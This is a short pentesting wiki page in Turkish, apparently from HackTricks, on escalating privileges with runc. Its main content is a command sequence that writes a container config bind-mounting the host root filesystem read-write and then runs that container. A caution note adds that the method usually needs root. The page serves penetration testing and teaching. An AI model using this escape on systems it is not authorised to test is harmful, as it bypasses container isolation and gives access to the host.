# RunC Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Temel bilgiler

Eğer **runc** hakkında daha fazla bilgi edinmek istiyorsanız, aşağıdaki sayfayı kontrol edin:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## YÜKSELTME

Eğer `runc`'ın hostta kurulu olduğunu bulursanız, **hostun kök / klasörünü monte eden bir konteyner çalıştırabilirsiniz**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Bu her zaman çalışmayacaktır çünkü runc'ın varsayılan işlemi root olarak çalışmaktır, bu nedenle onu yetkisiz bir kullanıcı olarak çalıştırmak basitçe mümkün değildir (root'suz bir yapılandırmanız yoksa). Root'suz bir yapılandırmayı varsayılan yapmak genellikle iyi bir fikir değildir çünkü root'suz konteynerler içinde uygulanmayan birçok kısıtlama vardır. 

{{#include ../../banners/hacktricks-training.md}}
